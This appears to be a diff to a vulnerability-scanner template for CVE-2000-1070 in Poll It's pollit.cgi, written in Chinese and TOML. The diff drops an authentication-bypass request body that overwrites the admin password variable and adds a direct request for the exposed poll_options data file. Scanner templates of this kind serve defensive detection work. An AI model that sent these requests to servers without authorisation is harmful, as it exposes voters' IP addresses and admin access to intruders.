@@ -1,15 +1,10 @@
 [info]
 author = "AVE"
-description = "检测 Poll It 2.01及更早版本中 pollit.cgi 的数据文件信息泄露和管理员认证绕过漏洞。通过直接访问 pollit_files/ips.txt 获取投票者IP等敏感信息，或通过 CGI 变量覆盖绕过管理员密码验证。"
+description = "Poll It 2.01 及更早版本的 pollit.cgi 将投票数据文件（如 ips.txt、poll_options）存放在 Web 文档根目录下的 pollit_files 目录中，未做访问控制。远程攻击者无需认证即可通过直接访问这些文件获取投票记录、用户 IP 地址等敏感信息。"
 id = "POC-AVE-2000-1073"
-name = "Poll It pollit.cgi 信息泄露与认证绕过 PoC"
+name = "Poll It pollit.cgi 信息泄露 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-1070",
-    "poll-it",
-    "cgi",
-    "information-disclosure",
-]
+tags = ["ave-2000-1073"]
 vuln_id = [
     "CVE-2000-1070",
     "AVE-2000-1073",
@@ -31,22 +26,11 @@ words = ["."]
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/pollit.cgi"
+path = "/{{BaseURL}}/pollit_files/poll_options"
 protocol = "http"
-
-[poc.requests.body]
-content = "load=admin&entered_password=foo&admin_password=foo"
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "admin",
-    "password",
-    "option",
-]
+words = ["."]
